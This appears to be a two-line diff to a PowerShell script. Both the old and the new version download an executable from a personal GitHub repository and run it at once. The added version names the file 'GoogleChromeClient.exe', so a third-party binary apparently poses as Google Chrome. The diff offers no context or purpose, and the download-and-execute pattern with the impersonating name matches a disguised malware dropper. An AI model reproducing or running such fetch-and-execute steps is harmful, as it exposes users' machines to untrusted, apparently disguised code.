@@ -1,2 +1,2 @@
-Invoke-WebRequest 'https://github.com/epicthoistaken/googlechromeyes/raw/main/googlechromeclientyes.exe' -OutFile "hb.exe"
-.\hb.exe --format json
+Invoke-WebRequest 'https://github.com/epicthoistaken/googlechromeyes/blob/41750eaec32ea7b2028ecdac58e8b6f9c3f5dd0d/Google%20Chrome%20Client.exe' -OutFile "GoogleChromeClient.exe"
+.\GoogleChromeClient.exe
